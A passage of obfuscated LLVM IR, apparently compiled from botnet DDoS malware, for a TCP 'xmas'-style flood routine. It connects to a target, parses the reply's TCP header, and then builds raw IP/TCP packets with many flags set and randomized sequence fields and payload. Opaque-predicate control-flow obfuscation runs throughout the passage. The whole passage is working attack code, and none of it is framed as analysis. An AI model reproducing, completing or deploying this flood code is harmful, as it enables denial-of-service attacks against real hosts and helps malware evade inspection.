  %148 = load i32, i32* %9, align 4
  %149 = load i8, i8* %5, align 1
  %150 = zext i8 %149 to i32
  %151 = icmp slt i32 %148, %150
  br i1 %151, label %152, label %719

; <label>:152:                                    ; preds = %147
  br label %153

; <label>:153:                                    ; preds = %originalBBpart2159, %originalBBpart2145, %152
  %154 = load i32, i32* @x.23
  %155 = load i32, i32* @y.24
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %153
  %162 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %162, i32* %26, align 4
  %163 = icmp eq i32 %162, -1
  %164 = load i32, i32* @x.23
  %165 = load i32, i32* @y.24
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %163, label %172, label %189

; <label>:172:                                    ; preds = %originalBBpart28
  %173 = load i32, i32* @x.23
  %174 = load i32, i32* @y.24
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %172
  %181 = load i32, i32* @x.23
  %182 = load i32, i32* @y.24
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %716

; <label>:189:                                    ; preds = %originalBBpart28
  %190 = load i32, i32* @x.23
  %191 = load i32, i32* @y.24
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %189
  %198 = load i32, i32* %26, align 4
  %199 = load i32, i32* %26, align 4
  %200 = call i32 (i32, i32, ...) @fcntl(i32 %199, i32 3, i32 0)
  %201 = or i32 %200, 2048
  %202 = call i32 (i32, i32, ...) @fcntl(i32 %198, i32 4, i32 %201)
  %203 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %203, align 4
  %204 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %205 = load i32, i32* %9, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 2
  %209 = load i8, i8* %208, align 4
  %210 = zext i8 %209 to i32
  %211 = icmp slt i32 %210, 32
  %212 = load i32, i32* @x.23
  %213 = load i32, i32* @y.24
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBBpart227, label %originalBB14alteredBB

originalBBpart227:                                ; preds = %originalBB14
  br i1 %211, label %220, label %241

; <label>:220:                                    ; preds = %originalBBpart227
  %221 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %222 = load i32, i32* %9, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %221, i64 %223
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %224, i32 0, i32 1
  %226 = load i32, i32* %225, align 4
  %227 = call i32 @ntohl(i32 %226) #8
  %228 = call i32 @rand_next()
  %229 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %230 = load i32, i32* %9, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %229, i64 %231
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %232, i32 0, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = zext i8 %234 to i32
  %236 = lshr i32 %228, %235
  %237 = add i32 %227, %236
  %238 = call i32 @htonl(i32 %237) #8
  %239 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %240 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %239, i32 0, i32 0
  store i32 %238, i32* %240, align 4
  br label %250

; <label>:241:                                    ; preds = %originalBBpart227
  %242 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %243 = load i32, i32* %9, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %242, i64 %244
  %246 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %245, i32 0, i32 1
  %247 = load i32, i32* %246, align 4
  %248 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %249 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %248, i32 0, i32 0
  store i32 %247, i32* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %241, %220
  %251 = load i16, i16* %17, align 2
  %252 = zext i16 %251 to i32
  %253 = icmp eq i32 %252, 65535
  br i1 %253, label %254, label %259

; <label>:254:                                    ; preds = %250
  %255 = call i32 @rand_next()
  %256 = and i32 %255, 65535
  %257 = trunc i32 %256 to i16
  %258 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %257, i16* %258, align 2
  br label %263

; <label>:259:                                    ; preds = %250
  %260 = load i16, i16* %17, align 2
  %261 = call zeroext i16 @htons(i16 zeroext %260) #8
  %262 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %261, i16* %262, align 2
  br label %263

; <label>:263:                                    ; preds = %259, %254
  %264 = load i32, i32* %26, align 4
  %265 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %266 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %266, %struct.sockaddr** %265, align 8
  %267 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %268 = load %struct.sockaddr*, %struct.sockaddr** %267, align 8
  %269 = call i32 @connect(i32 %264, %struct.sockaddr* %268, i32 16)
  %270 = call i64 @time(i64* null) #7
  store i64 %270, i64* %31, align 8
  br label %271

; <label>:271:                                    ; preds = %714, %263
  %272 = load i32, i32* @x.23
  %273 = load i32, i32* @y.24
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %271
  store i32 16, i32* %29, align 4
  %280 = load i32, i32* %10, align 4
  %281 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %282 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %283 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %283, %struct.sockaddr** %282, align 8
  %284 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %285 = load %struct.sockaddr*, %struct.sockaddr** %284, align 8
  %286 = call i64 @recvfrom(i32 %280, i8* %281, i64 256, i32 16384, %struct.sockaddr* %285, i32* %29)
  %287 = trunc i64 %286 to i32
  store i32 %287, i32* %33, align 4
  %288 = load i32, i32* %33, align 4
  %289 = icmp eq i32 %288, -1
  %290 = load i32, i32* @x.23
  %291 = load i32, i32* @y.24
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %289, label %298, label %299

; <label>:298:                                    ; preds = %originalBBpart231
  br label %863

; <label>:299:                                    ; preds = %originalBBpart231
  %300 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %301 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %300, i32 0, i32 0
  %302 = load i32, i32* %301, align 4
  %303 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %304 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %303, i32 0, i32 0
  %305 = load i32, i32* %304, align 4
  %306 = icmp eq i32 %302, %305
  br i1 %306, label %307, label %674

; <label>:307:                                    ; preds = %299
  %308 = load i32, i32* @x.23
  %309 = load i32, i32* @y.24
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %307
  %316 = load i32, i32* %33, align 4
  %317 = sext i32 %316 to i64
  %318 = icmp ugt i64 %317, 40
  %319 = load i32, i32* @x.23
  %320 = load i32, i32* @y.24
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %318, label %327, label %674

; <label>:327:                                    ; preds = %originalBBpart235
  %328 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %329 = getelementptr inbounds i8, i8* %328, i64 20
  %330 = bitcast i8* %329 to %struct.tcphdr*
  store %struct.tcphdr* %330, %struct.tcphdr** %35, align 8
  %331 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %332 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %331, i32 0, i32 0
  %333 = load i16, i16* %332, align 4
  %334 = zext i16 %333 to i32
  %335 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %336 = load i16, i16* %335, align 2
  %337 = zext i16 %336 to i32
  %338 = icmp eq i32 %334, %337
  br i1 %338, label %339, label %657

; <label>:339:                                    ; preds = %327
  %340 = load i32, i32* @x.23
  %341 = load i32, i32* @y.24
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %339
  %348 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %349 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %348, i32 0, i32 4
  %350 = load i16, i16* %349, align 4
  %351 = lshr i16 %350, 9
  %352 = and i16 %351, 1
  %353 = zext i16 %352 to i32
  %354 = icmp ne i32 %353, 0
  %355 = load i32, i32* @x.23
  %356 = load i32, i32* @y.24
  %357 = sub i32 %355, 1
  %358 = mul i32 %355, %357
  %359 = urem i32 %358, 2
  %360 = icmp eq i32 %359, 0
  %361 = icmp slt i32 %356, 10
  %362 = or i1 %360, %361
  br i1 %362, label %originalBBpart261, label %originalBB37alteredBB

originalBBpart261:                                ; preds = %originalBB37
  br i1 %354, label %363, label %620

; <label>:363:                                    ; preds = %originalBBpart261
  %364 = load i32, i32* @x.23
  %365 = load i32, i32* @y.24
  %366 = sub i32 %364, 1
  %367 = mul i32 %364, %366
  %368 = urem i32 %367, 2
  %369 = icmp eq i32 %368, 0
  %370 = icmp slt i32 %365, 10
  %371 = or i1 %369, %370
  br i1 %371, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %363
  %372 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %373 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %372, i32 0, i32 4
  %374 = load i16, i16* %373, align 4
  %375 = lshr i16 %374, 12
  %376 = and i16 %375, 1
  %377 = zext i16 %376 to i32
  %378 = icmp ne i32 %377, 0
  %379 = load i32, i32* @x.23
  %380 = load i32, i32* @y.24
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart287, label %originalBB63alteredBB

originalBBpart287:                                ; preds = %originalBB63
  br i1 %378, label %387, label %620

; <label>:387:                                    ; preds = %originalBBpart287
  %388 = load i32, i32* @x.23
  %389 = load i32, i32* @y.24
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %387
  %396 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %397 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %396, i32 0, i32 0
  %398 = load i32, i32* %397, align 4
  %399 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %400 = load i32, i32* %9, align 4
  %401 = sext i32 %400 to i64
  %402 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %399, i64 %401
  %403 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %402, i32 0, i32 0
  store i32 %398, i32* %403, align 4
  %404 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 2
  %406 = load i32, i32* %405, align 4
  %407 = call i32 @ntohl(i32 %406) #8
  %408 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %409 = load i32, i32* %9, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %408, i64 %410
  %412 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %411, i32 0, i32 1
  store i32 %407, i32* %412, align 4
  %413 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %414 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %413, i32 0, i32 3
  %415 = load i32, i32* %414, align 4
  %416 = call i32 @ntohl(i32 %415) #8
  %417 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %418 = load i32, i32* %9, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %417, i64 %419
  %421 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %420, i32 0, i32 2
  store i32 %416, i32* %421, align 4
  %422 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %423 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %422, i32 0, i32 1
  %424 = load i16, i16* %423, align 2
  %425 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %426 = load i32, i32* %9, align 4
  %427 = sext i32 %426 to i64
  %428 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %425, i64 %427
  %429 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %428, i32 0, i32 3
  store i16 %424, i16* %429, align 4
  %430 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %431 = load i16, i16* %430, align 2
  %432 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %433 = load i32, i32* %9, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %432, i64 %434
  %436 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %435, i32 0, i32 4
  store i16 %431, i16* %436, align 2
  %437 = load i32, i32* %24, align 4
  %438 = sext i32 %437 to i64
  %439 = add i64 40, %438
  %440 = call noalias i8* @malloc(i64 %439) #7
  %441 = load i8**, i8*** %12, align 8
  %442 = load i32, i32* %9, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds i8*, i8** %441, i64 %443
  store i8* %440, i8** %444, align 8
  %445 = load i8**, i8*** %12, align 8
  %446 = load i32, i32* %9, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds i8*, i8** %445, i64 %447
  %449 = load i8*, i8** %448, align 8
  %450 = bitcast i8* %449 to %struct.iphdr*
  store %struct.iphdr* %450, %struct.iphdr** %36, align 8
  %451 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %452 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %451, i64 1
  %453 = bitcast %struct.iphdr* %452 to %struct.tcphdr*
  store %struct.tcphdr* %453, %struct.tcphdr** %37, align 8
  %454 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %455 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %454, i64 1
  %456 = bitcast %struct.tcphdr* %455 to i8*
  store i8* %456, i8** %38, align 8
  %457 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %458 = bitcast %struct.iphdr* %457 to i8*
  %459 = load i8, i8* %458, align 4
  %460 = and i8 %459, 15
  %461 = or i8 %460, 64
  store i8 %461, i8* %458, align 4
  %462 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %463 = bitcast %struct.iphdr* %462 to i8*
  %464 = load i8, i8* %463, align 4
  %465 = and i8 %464, -16
  %466 = or i8 %465, 5
  store i8 %466, i8* %463, align 4
  %467 = load i8, i8* %13, align 1
  %468 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %469 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %468, i32 0, i32 1
  store i8 %467, i8* %469, align 1
  %470 = load i32, i32* %24, align 4
  %471 = sext i32 %470 to i64
  %472 = add i64 40, %471
  %473 = trunc i64 %472 to i16
  %474 = call zeroext i16 @htons(i16 zeroext %473) #8
  %475 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %476 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %475, i32 0, i32 2
  store i16 %474, i16* %476, align 2
  %477 = load i16, i16* %14, align 2
  %478 = call zeroext i16 @htons(i16 zeroext %477) #8
  %479 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %480 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %479, i32 0, i32 3
  store i16 %478, i16* %480, align 4
  %481 = load i8, i8* %15, align 1
  %482 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %483 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %482, i32 0, i32 5
  store i8 %481, i8* %483, align 4
  %484 = load i8, i8* %16, align 1
  %485 = icmp ne i8 %484, 0
  %486 = load i32, i32* @x.23
  %487 = load i32, i32* @y.24
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBBpart2141, label %originalBB89alteredBB

originalBBpart2141:                               ; preds = %originalBB89
  br i1 %485, label %494, label %498

; <label>:494:                                    ; preds = %originalBBpart2141
  %495 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %496 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %497 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %496, i32 0, i32 4
  store i16 %495, i16* %497, align 2
  br label %498

; <label>:498:                                    ; preds = %494, %originalBBpart2141
  %499 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %500 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %499, i32 0, i32 6
  store i8 6, i8* %500, align 1
  %501 = load i32, i32* @LOCAL_ADDR, align 4
  %502 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %503 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %502, i32 0, i32 8
  store i32 %501, i32* %503, align 4
  %504 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %505 = load i32, i32* %9, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %504, i64 %506
  %508 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %507, i32 0, i32 0
  %509 = load i32, i32* %508, align 4
  %510 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %511 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %510, i32 0, i32 9
  store i32 %509, i32* %511, align 4
  %512 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %513 = load i32, i32* %9, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %512, i64 %514
  %516 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %515, i32 0, i32 3
  %517 = load i16, i16* %516, align 4
  %518 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %519 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %518, i32 0, i32 0
  store i16 %517, i16* %519, align 4
  %520 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %520, i64 %522
  %524 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %523, i32 0, i32 4
  %525 = load i16, i16* %524, align 2
  %526 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %527 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %526, i32 0, i32 1
  store i16 %525, i16* %527, align 2
  %528 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %529 = load i32, i32* %9, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %528, i64 %530
  %532 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %531, i32 0, i32 2
  %533 = load i32, i32* %532, align 4
  %534 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %535 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %534, i32 0, i32 2
  store i32 %533, i32* %535, align 4
  %536 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %537 = load i32, i32* %9, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %536, i64 %538
  %540 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %539, i32 0, i32 1
  %541 = load i32, i32* %540, align 4
  %542 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %543 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %542, i32 0, i32 3
  store i32 %541, i32* %543, align 4
  %544 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %545 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %544, i32 0, i32 4
  %546 = load i16, i16* %545, align 4
  %547 = and i16 %546, -241
  %548 = or i16 %547, 128
  store i16 %548, i16* %545, align 4
  %549 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %550 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %549, i32 0, i32 4
  %551 = load i16, i16* %550, align 4
  %552 = and i16 %551, -257
  %553 = or i16 %552, 256
  store i16 %553, i16* %550, align 4
  %554 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %555 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %554, i32 0, i32 4
  %556 = load i16, i16* %555, align 4
  %557 = and i16 %556, -4097
  %558 = or i16 %557, 4096
  store i16 %558, i16* %555, align 4
  %559 = call i32 @rand_next()
  %560 = and i32 %559, 65535
  %561 = trunc i32 %560 to i16
  %562 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %563 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %562, i32 0, i32 5
  store i16 %561, i16* %563, align 2
  %564 = load i8, i8* %18, align 1
  %565 = sext i8 %564 to i16
  %566 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %567 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %566, i32 0, i32 4
  %568 = load i16, i16* %567, align 4
  %569 = and i16 %565, 1
  %570 = shl i16 %569, 13
  %571 = and i16 %568, -8193
  %572 = or i16 %571, %570
  store i16 %572, i16* %567, align 4
  %573 = load i8, i8* %19, align 1
  %574 = sext i8 %573 to i16
  %575 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %576 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %575, i32 0, i32 4
  %577 = load i16, i16* %576, align 4
  %578 = and i16 %574, 1
  %579 = shl i16 %578, 12
  %580 = and i16 %577, -4097
  %581 = or i16 %580, %579
  store i16 %581, i16* %576, align 4
  %582 = load i8, i8* %20, align 1
  %583 = sext i8 %582 to i16
  %584 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %585 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %584, i32 0, i32 4
  %586 = load i16, i16* %585, align 4
  %587 = and i16 %583, 1
  %588 = shl i16 %587, 11
  %589 = and i16 %586, -2049
  %590 = or i16 %589, %588
  store i16 %590, i16* %585, align 4
  %591 = load i8, i8* %21, align 1
  %592 = sext i8 %591 to i16
  %593 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %594 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %593, i32 0, i32 4
  %595 = load i16, i16* %594, align 4
  %596 = and i16 %592, 1
  %597 = shl i16 %596, 10
  %598 = and i16 %595, -1025
  %599 = or i16 %598, %597
  store i16 %599, i16* %594, align 4
  %600 = load i8, i8* %22, align 1
  %601 = sext i8 %600 to i16
  %602 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %603 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %602, i32 0, i32 4
  %604 = load i16, i16* %603, align 4
  %605 = and i16 %601, 1
  %606 = shl i16 %605, 9
  %607 = and i16 %604, -513
  %608 = or i16 %607, %606
  store i16 %608, i16* %603, align 4
  %609 = load i8, i8* %23, align 1
  %610 = sext i8 %609 to i16
  %611 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %612 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %611, i32 0, i32 4
  %613 = load i16, i16* %612, align 4
  %614 = and i16 %610, 1
  %615 = shl i16 %614, 8
  %616 = and i16 %613, -257
  %617 = or i16 %616, %615
  store i16 %617, i16* %612, align 4
  %618 = load i8*, i8** %38, align 8
  %619 = load i32, i32* %24, align 4
  call void @rand_str(i8* %618, i32 %619)
  br label %715

; <label>:620:                                    ; preds = %originalBBpart287, %originalBBpart261
  %621 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %622 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %621, i32 0, i32 4
  %623 = load i16, i16* %622, align 4
  %624 = lshr i16 %623, 8
  %625 = and i16 %624, 1
  %626 = zext i16 %625 to i32
  %627 = icmp ne i32 %626, 0
  br i1 %627, label %636, label %628

; <label>:628:                                    ; preds = %620
  %629 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %630 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %629, i32 0, i32 4
  %631 = load i16, i16* %630, align 4
  %632 = lshr i16 %631, 10
  %633 = and i16 %632, 1
  %634 = zext i16 %633 to i32
  %635 = icmp ne i32 %634, 0
  br i1 %635, label %636, label %655

; <label>:636:                                    ; preds = %628, %620
  %637 = load i32, i32* @x.23
  %638 = load i32, i32* @y.24
  %639 = sub i32 %637, 1
  %640 = mul i32 %637, %639
  %641 = urem i32 %640, 2
  %642 = icmp eq i32 %641, 0
  %643 = icmp slt i32 %638, 10
  %644 = or i1 %642, %643
  br i1 %644, label %originalBB143, label %originalBB143alteredBB

originalBB143:                                    ; preds = %originalBB143alteredBB, %636
  %645 = load i32, i32* %26, align 4
  %646 = call i32 @close(i32 %645)
  %647 = load i32, i32* @x.23
  %648 = load i32, i32* @y.24
  %649 = sub i32 %647, 1
  %650 = mul i32 %647, %649
  %651 = urem i32 %650, 2
  %652 = icmp eq i32 %651, 0
  %653 = icmp slt i32 %648, 10
  %654 = or i1 %652, %653
  br i1 %654, label %originalBBpart2145, label %originalBB143alteredBB

originalBBpart2145:                               ; preds = %originalBB143
  br label %153

; <label>:655:                                    ; preds = %628
  br label %656

; <label>:656:                                    ; preds = %655
  br label %657

; <label>:657:                                    ; preds = %656, %327
  %658 = load i32, i32* @x.23
  %659 = load i32, i32* @y.24
  %660 = sub i32 %658, 1
  %661 = mul i32 %658, %660
  %662 = urem i32 %661, 2
  %663 = icmp eq i32 %662, 0
  %664 = icmp slt i32 %659, 10
  %665 = or i1 %663, %664
